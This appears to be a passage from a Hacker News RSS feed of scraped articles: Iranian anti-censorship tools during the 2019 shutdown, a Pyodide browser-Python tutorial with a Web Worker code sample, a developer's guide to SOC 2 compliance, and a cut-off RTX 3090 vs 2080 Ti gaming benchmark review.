September 24, 2020 | https://restofworld.org/2020/cat-and-mouse-censorship/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/cat-and-mouse-censorship/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>One November morning last year, Mehdi Yahyanejad listened to a voicemail in his Los Angeles office: ‚ÄúI‚Äôm contacting you from the city of Tehran,‚Äù said the voice. ‚ÄúThis was the first time I‚Äôve experienced an internet shutdown. ‚Ä¶ It feels like I‚Äôm in a prison.‚Äù</p>



<p>A few weeks earlier, Iran‚Äôs largest mobile networks and internet providers went offline. Amid weeks of growing anti-regime protests, Iranian authorities imposed <a href="https://edition.cnn.com/2019/11/18/middleeast/iran-protests-explained-intl/index.html">the longest internet shutdown</a> in the country‚Äôs history, effectively cutting off external communication for over 80 million Iranians. In an unprecedented crackdown, regime forces <a href="https://www.amnesty.org/en/latest/news/2020/05/iran-details-released-of-304-deaths-during-protests-six-months-after-security-forces-killing-spree/">killed more than 300 protesters</a> and arrested <a href="https://www.amnesty.org/en/latest/news/2019/12/iran-thousands-arbitrarily-detained-and-at-risk-of-torture-in-chilling-post-protest-crackdown/">over 7,000 people</a>. When access was finally restored on November 23, nearly half the country was still unable to come online.</p>



<p>Nine months after the November blackout, Iranians still live in fear of another all-out shutdown. As authorities tighten their hold on internet access, diaspora-led companies are filling the gap for Iranians who are seeking a way to bypass censors. The circumvention tools, created largely by diaspora entrepreneurs, are becoming increasingly critical as they face a crackdown at home and the bite of American-led sanctions online.</p>



<p>On November 15, as Iranian authorities first moved to induce the digital blackout, 44-year-old Yahyanejad raced against the clock in Los Angeles to make sure that people back home had downloaded his satellite file-casting application <a href="https://www.toosheh.org/">Toosheh</a>.<em> </em>‚ÄúIt was a very small window,‚Äù says Yahyanejad. ‚ÄúOnce they were fully disconnected, I wasn‚Äôt sure they‚Äôd be able to download the software.‚Äù&nbsp;</p>



<p>Launched by Yahyanejad in 2016, the technology aggregates uncensored content, like news articles, YouTube videos, and podcasts, and sends it to Iranian homes directly via satellite TV. When Yahyanejad first began developing Toosheh in 2013, an estimated 70% of Iranian households owned a satellite dish, while around 20% had access to the internet. Even as internet access has grown, state censorship means Toosheh‚Äôs satellite technology is a much more reliable source for uncensored content. Iranians can install Toosheh‚Äôs satellite channel and receive a daily dispatch in the form of a file package of up to 8 gigabytes. Once a user downloads the app, the satellite transfers circumvent the internet entirely.&nbsp;</p>



<p>Yahyanejad says Toosheh gained nearly 100,000 new Iranians users in November 2019. In the absence of an internet connection, it became the only way for many users to access news from the outside world. The voice on Toosheh‚Äôs voicemail belonged to one such user, a 34-year-old high school principal in Tehran who downloaded emergency VPN and proxy tools delivered to him through the satellite service.&nbsp;</p>



<p>Having navigated extensive cyber censorship for over a decade, Iranians are tech savvy and <a href="https://www.bbc.com/news/blogs-trending-42612546">adept at nimbly crossing firewalls</a>, using proxies and foreign circumvention tools. ‚ÄúIt‚Äôs a constant cat-and-mouse game,‚Äù says Fereidoon Bashar, executive director of ASL19, a Canadian organization working to help Iranians bypass internet censorship. The group often works in tandem with Yahyanejad to distribute proxy tools.&nbsp;</p>



<p>Bashar says Iranians adapt quickly to ever-changing institutionalized control online. But the last five years of Iranian president Hassan Rouhani‚Äôs rule have seen <a href="https://www.cnet.com/news/irans-president-plans-to-cut-countrys-internet-off-from-the-rest-of-the-world/">a tighter grip on internet connections</a>. Site blocking and calculated internet outages have become easier to enforce: the regime has reduced Iran‚Äôs dependence on global networks by pushing a local intranet, with the <a href="https://www.wired.com/2016/09/how-iran-is-building-its-censorship-friendly-domestic-internet/">aim to keep online traffic</a> inside the country. With strict American sanctions that threaten hefty fines for companies interfacing with Iran, foreign tech companies limit ordinary Iranians‚Äô ability to purchase reliable proxies <a href="https://www.wired.com/2016/09/how-iran-is-building-its-censorship-friendly-domestic-internet/">out of an abundance of caution</a>. Riddled with insecurity, the local VPN black market is not a reliable option for those trying to avoid government attention.</p>



<p>But even as internet access grew incrementally difficult over the years, no one saw the November blackout coming. ‚ÄúAn internet shutdown was previously viewed as a kind of dystopian political campaign,‚Äù says Kaveh Azarhoosh, an internet policy researcher. In November, the worst-case scenario for Iran‚Äôs censorship suddenly became a reality.&nbsp;&nbsp;</p>



<p>In the early days of the protest, Toosheh created a special ‚ÄúProtest News Package.‚Äù Every night, after aggregating content from over 200 publications, Toosheh delivered digital bundles containing clips of protests occuring in different cities: Tabriz, Qom, Shiraz, Mashhad, and others. It also contained slides about how to stay safe during a protest; crucial news coverage from banned sites, like the <em>New York Times</em>, Voice of America Persian, and Deutsche Welle; and a curated compilation of tweets from Iranian politicians. These packages weren‚Äôt just bringing news of the outside world to Iran: they kept Iranians informed about what was happening inside their own country too.</p>



<p>Yahyanejad, a physicist by training, left Iran in 1997 to pursue a Ph.D. from the Massachusetts Institute of Technology. ‚ÄúI‚Äôve lived in Iran, and I‚Äôve gone to school and college there,‚Äù he explains. ‚ÄúI know that this repressive government exists because they are able to control the flow of information.‚Äù He says he‚Äôs always had an interest in limiting their control. ‚ÄúI want,‚Äù he says, ‚Äúto see democracy in Iran in my lifetime.‚Äù&nbsp;</p>



<p>In 2006, Yahyanejad launched a Reddit-like forum called <a href="https://www.balatarin.com/">Balatarin</a>. ‚ÄúIts popularity surprised me,‚Äù he says. The site posted a translated rumor about the supreme leader‚Äôs death, after he hadn‚Äôt been seen in public for two months, and was swiftly blocked by Iran shortly after. The moment was a turning point for Yahyanejad, who says, ‚ÄúI made a conscious decision to keep the platform open at a personal cost.‚Äù&nbsp;</p>



<p>The Iranian blocks on Balatarin inspired Yahyanejad to explore censorship circumvention. He launched the satellite app Toosheh in 2016. ‚ÄúI <a href="https://www.youtube.com/watch?v=FWfwF8Gx6VA">went on BBC Persian‚Äôs ‚ÄòNewshour</a>,‚Äô and as soon as I talked about it, people started downloading and testing it immediately,‚Äù he says.&nbsp;</p>



<p>Yahyanjad finds himself among a cohort of diaspora Iranians working to fight the regime‚Äôs censors. ASL19, the Canadian technology group, collaborated with him to deliver proxy tools to over half a million Iranians during November‚Äôs shutdown. ASL19‚Äôs Bashar, who left Iran in the early 2000s before <a href="https://opennet.net/blog/2013/02/after-green-movement-internet-controls-iran-2009-2012">the tumultuous Green Movement</a>, says diaspora Iranians are stepping into the field because Iranians ‚Äúrisk harsh conditions, imprisonment, and long sentences‚Äù if they‚Äôre caught creating circumvention tools inside the country.&nbsp;&nbsp;</p>



<p>But even outside of Iran, outspoken diaspora activists like Bashar and Yahyanejad face immense risks. In June, it was reported that an Iranian activist named Ruhollah Zam was <a href="https://www.bbc.com/news/world-middle-east-53238000">sentenced to death </a>in Iran after creating a popular anti-government Telegram news channel that he operated while living in exile in France. The channel, with 1.4 million followers, was shut down shortly after. For Yahyanejad, who knew of Ruhollah through the diaspora community, the ordeal was a shot across the bow. ‚ÄúI can never go back to Iran,‚Äù Yahyanejad admits. ‚ÄúBut I see myself as part of the movement.‚Äù&nbsp;</p>



<p>Yahyanejad‚Äôs work has become crucial for Iranians, even after November‚Äôs shutdown. On July 14, following news that Iran‚Äôs Supreme Court had upheld the death sentences of three young anti-regime protesters, Iranians took to banned social media sites in an unprecedented protest, with over 6 million posts under the hashtag #DontExecute. Hours after #DontExecute began trending online, digital rights organization NetBlocks <a href="https://twitter.com/netblocks/status/1283106806332620801?s=20">monitored disruptions in the network</a>. Panicked users, still reeling from November‚Äôs shutdown, speculated another block was imminent. Luckily, an all-out ban didn‚Äôt occur, but the renewed threat of one was enough to increase Toosheh‚Äôs usage by more than 50% in the days that followed.&nbsp;</p>



<p>For Yahyanejad, who has been actively fighting the Iranian regime‚Äôs censorship for over a decade, the past year is proof that his work is even more necessary. ‚ÄúInternet shutdowns are psychological tools designed to terrify populations, to convince them that they are voiceless,‚Äù he says. ‚ÄúFighting shutdowns is important so that you can show people that they are not alone and that there are others.‚Äù</p>
		</div></div>]]>
            </description>
            <link>https://restofworld.org/2020/cat-and-mouse-censorship/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578551</guid>
            <pubDate>Thu, 24 Sep 2020 13:46:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running Python in the Browser with Web Assembly]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578499">thread link</a>) | @lanecwagner
<br/>
September 24, 2020 | https://qvault.io/2020/09/24/running-python-in-the-browser-with-web-assembly/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/09/24/running-python-in-the-browser-with-web-assembly/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
				<div id="content">
			
	<div id="primary">
		<main id="main">
			
<article id="post-67191" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
				
		
		<!-- .entry-header -->

		
		<div itemprop="text">
			
<p>We‚Äôve been wanting to expand <a href="https://app.qvault.io/">Qvault‚Äôs course curriculum</a>, and one of the most requested programming languages has been Python. Because our courses allow students to write and execute code right in the web browser, we decided to look into existing projects that allow a Python interpreter to run in the browser using Web Assembly. We settled on a tool called <a href="https://github.com/iodide-project/pyodide" rel="noopener">Pyodide</a>, which does just that.</p>



<p>To see it in action, check out the <a href="https://app.qvault.io/playground/python">finished product, a Python playground</a>.</p>



<h2>What is Pyodide?</h2>



<p>Pyodide is an open-source project that comprises a Python interpreter that has been compiled to Web Assembly.</p>



<blockquote><p>WebAssembly (abbreviated&nbsp;<em>Wasm</em>) is a binary instruction format for a stack-based virtual machine. Wasm is designed as a portable compilation target for programming languages, enabling deployment on the web for client and server applications.</p><cite><a href="https://webassembly.org/" target="_blank" aria-label="webassembly.org (opens in a new tab)" rel="noreferrer noopener nofollow">webassembly.org</a></cite></blockquote>



<p>In other words, normally only JavaScript can run in a browser, but if you can compile your source code to Wasm, then you can run <em>any</em> programming language in the browser. (At the time of writing we run Python, Rust, and Go this way on our <a href="https://app.qvault.io/playground/python">playground</a> and in our <a href="https://app.qvault.io/">courses</a>)</p>



<blockquote><p>Pyodide&nbsp;brings the Python 3.8 runtime to the browser via WebAssembly, along with the Python scientific stack including NumPy, Pandas, Matplotlib, parts of SciPy, and NetworkX. The&nbsp;<code>packages</code>&nbsp;directory&nbsp;lists over 35 packages which are currently available.</p><cite><a href="https://github.com/iodide-project/pyodide" target="_blank" aria-label="Github Project (opens in a new tab)" rel="noreferrer noopener nofollow">Github Project</a></cite></blockquote>



<h2>How Did We Do It?</h2>



<p>Our Python execution plan is quite similar to the way we run Go code in the browser. There are basically three steps:</p>



<ul><li>Write a worker file that defines how code is executed</li><li>Write a worker helper that abstracts the details of spinning up, communicating, and terminating workers</li><li>Implement the helper in the view so that users can execute code and see the code‚Äôs output</li></ul>



<p> If you want to know how that all works please read <a href="https://qvault.io/2020/09/23/running-go-in-the-browser-with-wasm-and-web-workers/">this article about Web Workers and WASM in Go before continuing.</a></p>



<p>If you have finished that first article on Web Workers, then all you will need to understand the difference between our Python and Go logic is the worker file itself:</p>



<pre><code lang="javascript">// pull down pyodide from the public CDN
importScripts('https://pyodide-cdn2.iodide.io/v0.15.0/full/pyodide.js');

addEventListener('message', async (e) =&gt; {
  // wait for the interpreter to be fully loaded
  await languagePluginLoader;

  self.runPythonWithStdout = () =&gt; {
    try {
      // execute the code passed to the worker
      pyodide.runPython(e.data);
    } catch (err){
      postMessage({
        error: err
      });
      return;
    }

    // capture the code's standard output
    // and send it back to the main thread
    let stdout = pyodide.runPython("sys.stdout.getvalue()")
    if (stdout) {
      stdout = stdout.split('\n')
      for (line of stdout){
        postMessage({
          message: line
        });
      }
    }
  }

  // redirect stdout to io.StringIO so that we can get it later
  pyodide.runPython(`
    import io, code, sys
    from js import runPythonWithStdout
    sys.stdout = io.StringIO()
    sys.stderr = io.StringIO()
    ## This runs self.runPythonWithStdout defined in the JS
    runPythonWithStdout()
  `)

  postMessage({
    done: true
  });
}, false);</code></pre>



<p>As you can see, the only particularly challenging part for our use case was adding the glue to properly capture the code‚Äôs standard output.</p>




		</div><!-- .entry-content -->

					<!-- .entry-meta -->
			</div><!-- .inside-article -->
</article><!-- #post-## -->

					

							</main><!-- #main -->
	</div><!-- #primary -->

	<!-- #secondary -->

	</div><!-- #content -->
</div></div>]]>
            </description>
            <link>https://qvault.io/2020/09/24/running-python-in-the-browser-with-web-assembly/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578499</guid>
            <pubDate>Thu, 24 Sep 2020 13:40:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Developer's Guide to SoC 2 Compliance]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578450">thread link</a>) | @jacobwg
<br/>
September 24, 2020 | https://workos.com/blog/the-developers-guide-to-soc-2-compliance | <a href="https://web.archive.org/web/*/https://workos.com/blog/the-developers-guide-to-soc-2-compliance">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><p>Nobody wakes up in the morning excited to deal with a SOC 2 audit, but completing one will help your company grow and close larger deals faster. SOC 2 covers <em>a lot</em>, and it‚Äôs not just an engineering checkmark - but if you‚Äôre a developer at a not-huge company going through SOC 2 compliance, chances are you‚Äôll need to get involved. This guide will cover everything you need to know from a technical perspective, from basic access controls to encrypting data at rest. <em>‚Äç</em></p><p><em>(Note: this guide is NOT a comprehensive assessment of what you‚Äôll need to pass SOC 2 compliance, nor is it legal advice. The goal here is just to help developers understand what they‚Äôll need to do to make sure that tech and infrastructure aren‚Äôt holding things up.)</em></p><h2>What SOC 2 is and why it's important</h2><p><em>SOC 2</em> is a certification ‚Äì an objective third party checking your company out ‚Äì developed by the AICPA, one of the big ‚Äúgoverning bodies‚Äù of accountants in the U.S (riveting, I know). The way it works is that you hire an auditor to investigate how secure and trustworthy your company is, fill in any holes they identify, and then they certify you as SOC 2 compliant. Once you‚Äôve passed an audit, you can display the SOC 2 logo on your site, tell your customers and leads that you‚Äôre compliant, and close those bigger deals. </p><p>The important thing about SOC 2 is that it‚Äôs not just a stamp for giant enterprises - like <a href="https://workos.com/blog/the-developers-guide-to-sso">SSO</a> and <a href="https://workos.com/blog/the-developers-guide-to-directory-sync-scim">Directory Sync</a>, even fast growing startups are starting to require more advanced security measures before engaging with vendors. And as we‚Äôll see in a bit, most of what you‚Äôll need to work on to be SOC 2 compliant overlaps a lot with engineering best practices anyway. So if you‚Äôre considering whether SOC 2 compliance is worth it for your company, it might be a realistic fit earlier than you think - and help you stand out to potential customers.</p><p>Now if you‚Äôre thinking that SOC 2 implies the existence of a SOC 1, you‚Äôd be right, but SOC 1 is a lot less popular among SaaS startups. It‚Äôs generally a lower lift certification and doesn‚Äôt meet the security requirements that those larger deals are looking for. There‚Äôs also a SOC 3, but same story here - generally not the focus for the customers you‚Äôre trying to woo. SOC 2 is the big one.</p><p>So what exactly are these auditors looking for? What makes your company SOC 2 compliant? The answer, weirdly enough, is that criteria are subjective and company-specific - the auditor you work with will put together a plan. Generally, they‚Äôre looking for a few things:<br></p><ul role="list"><li>There‚Äôs quality <strong>oversight of the company</strong> as a whole (performance reviews, independent voices, background checks, etc.)</li><li>The <strong>SDLC</strong> (software development lifecycle) is transparent, trackable, and controlled (issue tracking, unit testing, version control, etc.)</li><li>Your <strong>application and underlying infrastructure</strong> are secure and monitored (encryption, logging, APM, vulnerability scans, etc.)</li><li>You‚Äôve implemented <strong>access controls</strong> for internal services and SaaS (de-provisioning accounts, 2FA, malware detection, etc.)</li></ul><p>If a lot of these examples look familiar to you, it‚Äôs because you‚Äôve probably already implemented them. The good news about SOC 2 is that as it relates to engineering, the requirements are generally pretty agreeable and a lot of modern SWE orgs already have issue tracking, review pipelines, vulnerability checks, and a good amount of the remaining checks auditors will be looking for. </p><p>We‚Äôll dive into the SDLC, app and infrastructure, access controls, and then take a look at how you can save time with pre-built software like <a href="https://www.vanta.com/">Vanta</a> that takes care of a lot of the annoying work you need to do for SOC 2, like policy generation.<strong>‚Äç</strong></p><h2><strong>The SDLC</strong>‚Äç</h2><p>Your auditor will put together a list of concrete checks that you‚Äôll need to either (a) provide evidence that you‚Äôve already done, or (b) get started on doing. Again - this is not a comprehensive list, but it should help you get started and think about what auditors will be looking for.<strong>‚Äç</strong></p><p><strong>‚Üí Issue Tracking</strong>‚Äç</p><p>Any ‚Äúissues‚Äù that relate to the core business - new features, products, bugs, vulnerabilities, etc. - should be tracked. There are a hundred ways to do this - if you‚Äôre at a bigger company you‚Äôre probably using <a href="https://www.atlassian.com/software/jira">JIRA</a>, the cool kids are using <a href="https://linear.app/">Linear</a>, and there‚Äôs also <a href="https://clubhouse.io/">Clubhouse</a>, <a href="https://guides.github.com/features/issues/">GitHub Issues</a>, and many many more. The auditors are just looking to make sure known problems don‚Äôt slip through the cracks, and when a problem arises it‚Äôs dealt with effectively and in a timely manner.<br></p><figure id="w-node-361755762ee0-e13c3243"><p><img src="https://assets-global.website-files.com/5f03ef1d331a69193fae6dcd/5f4fb0d32ee58930e6b6eb82_image%20(6).png" loading="lazy" alt=""></p></figure><p>They might ask for a sample of your tracked issues over a given time period. You‚Äôll save yourself a bunch of time down the road by finding a way to link commits and PRs to specific tickets, e.g. via a naming convention (BUG-453-fix-broken-dropdown).<strong>‚Äç</strong></p><p><strong>‚Üí Change Testing and Review Cycles</strong>‚Äç</p><p>Auditors will be looking for documented policies that govern how you track, test, approve, and validate changes to your core application. Now ideally if you‚Äôre reading this, you‚Äôre not pushing directly to master - you‚Äôve got a staging environment set up and a pull request process with required reviewers. Internal documentation might suffice here, but you‚Äôll probably need to generate a policy (something Vanta can help with - more on that later).</p><p>If you‚Äôre working via a monorepo, building foolproof review cycles is pretty easy (it‚Äôs just a setting in GitHub). But if you‚Äôve got a bunch of repositories all constantly changing, they should all ideally require reviews before merging in changes. Even if there‚Äôs only one engineer pushing code, laptops can get lost or stolen, and auditors will want to see that extra security to bestow the SOC 2 stamp.<strong>‚Äç</strong></p><h2><strong>Application and infrastructure</strong></h2><p>Here, auditors are trying to verify that your app is generally reliable, trackable, and that you fix things quickly when they come up. Again - all things that you probably already care about.<strong>‚Äç</strong></p><p><strong>‚Üí Encryption</strong>‚Äç</p><p>You‚Äôll generally want to encrypt customer data at rest, and make sure that sensitive requests (especially if they‚Äôre auth or customer data related) are encrypted in transit/motion (e.g. HTTPS). Ideally your site and app have SSL enforced, your certificate isn‚Äôt expired (duh), and there aren‚Äôt any known issues. Some auditors will also require an encryption policy that describes your company‚Äôs approach to encryption.<strong>‚Äç</strong></p><p><strong>‚Üí APM / Monitoring</strong>‚Äç</p><p>To be SOC 2 compliant, you‚Äôll need to set up a basic application monitoring system, either in house or via a vendor like <a href="https://www.datadoghq.com/">Datadog</a>. Auditors will also be interested in <em>what you do with this information</em> - how often is there downtime? How quickly does it get resolved? You might need to provide screenshots of outage statistics via your APM tool, and evidence that you resolved the issue via your issue tracking software. These usually come in the form of a post mortem / analysis and remedy of the root cause.</p><p>It‚Äôs not a given, but some auditors will specifically require that you set up a Load Balancer to handle traffic, and monitor that Load Balancer as well as your core app.<strong>‚Äç</strong></p><p><strong>‚Üí Logging and Backups</strong>‚Äç</p><p>Auditors will be looking for centralized logging from your app into a secure spot, via something custom like flat files, Elasticsearch, or an out of the box setup like Heroku (if you‚Äôre running on PaaS). You might be asked for daily backups - auditors are generally more concerned with your app‚Äôs data than your app itself, so if you‚Äôre using something like RDS, you can rely on their backup to S3 feature.<strong>‚Äç</strong></p><p><strong>‚Üí Vulnerabilities</strong>‚Äç</p><p>Unsurprisingly, this is a major focus of the audit process, even if it‚Äôs not a common day-to-day occurrence. Auditors are basically looking for 3 major things here:<br></p><ol role="list"><li>There‚Äôs a safe way for anyone (literally, anyone) to notify your company of vulnerabilities</li><li>Your team is proactively checking for vulnerabilities via review meetings and software</li><li>When a vulnerability gets uncovered, your team fixes it </li></ol><p>You‚Äôll want to set up an email inbox for disclosing vulnerabilities (e.g. <a href="https://workos.com/cdn-cgi/l/email-protection#21524442545348555861564e534a4e520f424e4c"><span data-cfemail="89faeceafcfbe0fdf0c9fee6fbe2e6faa7eae6e4">[email&nbsp;protected]</span></a>), put together a policy for how you handle incident response, and (if relevant) provide evidence that you‚Äôve resolved any major vulnerabilities (i.e. a post-mortem). Auditors will also look for proactive vulnerability scanning. If you‚Äôre running on managed infrastructure like Heroku, they do a lot of that for you. GitHub will also <a href="https://docs.github.com/en/github/managing-security-vulnerabilities/about-alerts-for-vulnerable-dependencies">notify you of any dependencies with known vulnerabilities</a>.<strong>‚Äç</strong></p><h2><strong>Access controls / SaaS</strong></h2><p>This is where things get a bit tedious. In addition to your core infra (AWS or whatever cloud you‚Äôre using), chances are you‚Äôre using a bunch of SaaS like PagerDuty, Segment, GitHub, and the like, some cloud based and some (potentially) on prem. Auditors are looking for rigid access controls: only relevant team members should have access to customer data and applications, and access needs to be revoked when employees leave the company.<strong>‚Äç</strong></p><p><strong>‚Üí Core Infrastructure Access</strong>‚Äç</p><p>Auditors will be looking for even stricter controls when it comes to managing core infra. In practice, this means a robust IAM setup in AWS (or your cloud provider of choice) with clear lines between admins and non-admins, and a review process for adding new folks to the organization. You might need to prove that review via a screenshot of someone asking permission, or something along those lines.</p><p>As part of this review, you‚Äôll probably end up needing to remove users from accounts that they previously had access to. Early on in the company lifecycle things are pretty free rein, but auditors will want to make sure that if you have no business querying the warehouse, you‚Äôre not on BigQuery.<strong>‚Äç</strong></p><p><strong>‚Üí De-provisioning Users</strong>‚Äç</p><p>If an employee leaves the company or gets terminated, their access to all company accounts - infrastructure, SaaS, any anything else - needs to be revoked, and auditors will often look for this to happen within one business day of the employee‚Äôs last day with the company. You‚Äôll probably need to do this manually for the first couple of years in the company lifecycle, but eventually you‚Äôll want to <a href="https://workos.com/blog/the-developers-guide-to-directory-sync-scim">set up Directory Sync so computers can do it for you</a>.<strong>‚Äç</strong></p><p><strong>‚Üí MFA</strong>‚Äç</p><p>Any method for accessing customer data needs to be protected by (at least) ‚Ä¶</p></figure></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://workos.com/blog/the-developers-guide-to-soc-2-compliance">https://workos.com/blog/the-developers-guide-to-soc-2-compliance</a></em></p>]]>
            </description>
            <link>https://workos.com/blog/the-developers-guide-to-soc-2-compliance</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578450</guid>
            <pubDate>Thu, 24 Sep 2020 13:34:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Jittery ‚Äì A new type of knowledge service]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24578403">thread link</a>) | @jittery
<br/>
September 24, 2020 | https://jittery.com/Jittery | <a href="https://web.archive.org/web/*/https://jittery.com/Jittery">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://jittery.com/Jittery</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578403</guid>
            <pubDate>Thu, 24 Sep 2020 13:29:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RTX 3090 vs. 2080 Ti ‚Äì Worth Upgrading?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578375">thread link</a>) | @SimonAC
<br/>
September 24, 2020 | https://techplanet.today/post/rtx-3090-vs-2080-ti-worth-upgrading | <a href="https://web.archive.org/web/*/https://techplanet.today/post/rtx-3090-vs-2080-ti-worth-upgrading">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                    
                    <p>I‚Äôve compared Nvidia‚Äôs new RTX 3090 graphics card against the 2080 Ti from last generation in games at 4K, 1440p, and 1080p resolutions as well as content creator workloads to see what the differences are.</p>
<p>Let‚Äôs start with the spec differences.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9a69ef578.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9a69ef578.webp">The 3090 has around 141% more CUDA cores than the 2080 Ti and 118% more memory. The 3090‚Äôs memory is also faster, and the 3090 has higher base and boost clock speeds as well, so it‚Äôs basically better in all regards, though it does also use more power.</p>
<p>Of course, at the moment the 3080 is closer in price to the 2080 Ti, but I don‚Äôt have a 3080 yet, I don‚Äôt think anyone does, and although the 2080 Ti had a $1000 MSRP, it seemed to sell around the $1200 USD price point, so $300 below the 3090 launch price.</p>
<p>The system that I‚Äôm testing with uses the Intel i9-10900K overclocked to 5.2GHz on all 10 cores in an MSI Z490 ACE Motherboard with 32gb of DDR4-3200 CL14 memory running in dual channel.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9a9308564.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9a9308564.webp">I‚Äôve got MSI‚Äôs GeForce RTX 3090 Gaming X Trio, and my Aorus 2080 Ti to compare with.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9aa5b3ab2.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9aa5b3ab2.webp">The latest drivers at the time of testing were used on both GPUs, so let‚Äôs get into the results.</p>
<h2>Gaming benchmarks</h2>
<p>Starting out with Microsoft Flight Simulator, I‚Äôve got the newer 3090 shown by the purple bars, and the older 2080 Ti shown by the red bars.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9ab446748.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9ab446748.webp">The three resolutions tested are on the left, starting from 1080p down the bottom, 1440p in the middle, and 4K up the top. In this test there was only a minor difference at 1080p, then the margin grows as we step up to higher resolutions. At 1440p the 3090 was 20% faster than the 2080 Ti, though this was the slowest result out of all 11 games tested at this resolution, then at 4K the 3090 was reaching 41% higher average frame rates.</p>
<p>Red Dead Redemption 2 was tested using the games benchmark tool.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9ac7d266c.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9ac7d266c.webp">Again there‚Äôs less of a difference at 1080p, as these higher end GPUs are better utilized at higher resolutions. At 1080p the 3090 was around 19% faster, but then at 4K the 3090 had a massive 57% lead - the biggest improvement seen out of all games that I‚Äôve tested.</p>
<p>Battlefield 5 was tested in campaign mode by running through the same mission on both graphics cards.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9ad9a7f6c.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9ad9a7f6c.webp">Interestingly the 2080 Ti actually had better 1% low results at 1080p, but this was the only time this happened. This game has a 200 FPS frame cap by default which the 3090 was hitting, so I suspect this may be why its 1% low was behind, given the 1% low on the 3090 was higher than this at 1440p. At 4K the 3090 is reaching a 45% higher average frame rate, even the 1% low from the 3090 is a fair amount ahead of the 2080 Ti‚Äôs average frame rate.</p>
<p>Shadow of the Tomb Raider was tested with the games built in benchmark.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9aece7811.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9aece7811.webp">The 2080 Ti was still delivering above 60 FPS in this test with the highest setting preset at 4K, but it‚Äôs no match for the 3090, which was again around 45% ahead. The difference is of course lower at lower resolutions, the 3090 is around 38% faster than the 2080 Ti at 1440p, then just 14% ahead at 1080p.</p>
<p>For Control I‚Äôll start with RTX off results.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9afcc4602.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9afcc4602.webp">At 1080p the 3090 has a modest 20% lead over the 2080 Ti, then a much higher 43% lead at 1440p, increasing further to a 53% higher average frame rate at 4K. The 3090 was still able to run the game well with above 60 FPS at 4K, making it a fair bit more playable compared to the 2080 Ti, at least with the highest setting preset that I‚Äôve tested.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b1ee431b.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" data-src="/storage/posts/2020/09/5f6c9b1ee431b.webp">With RTX on and DLSS enabled the 3090 is now 35% faster than the 2080 Ti at 1080p, compared to 20% with RTX off. The differences are nowhere near as big at 1440p and 4K though, for instance at 4K in this test the 3090 is 55% ahead of the 2080 Ti, but then in the RTX off results shown earlier the 3090 was 53% ahead. Basically RTX and DLSS in this game is running better on the 3090 than the 2080 Ti, but outside of 1080p it‚Äôs not that much better.</p>
<p>I‚Äôve tested Metro Exodus with the game's benchmark tool.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b4244c86.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" data-src="/storage/posts/2020/09/5f6c9b4244c86.webp">There are some nice gains with the 3090. At 4K we‚Äôre looking at a 45% higher average frame rate from the 3090, and around 25% higher at the lower 1080p resolution.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b523b343.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9b523b343.webp">In Death Stranding the 3090 was giving me 1% lows that were ahead of the average frame rate of the 2080 Ti at 4K and 1440p resolutions, it was close at 1080p but not quite there. Like many other games, we‚Äôre around the 46% point in terms of average FPS improvement with the 3090 at 4K.</p>
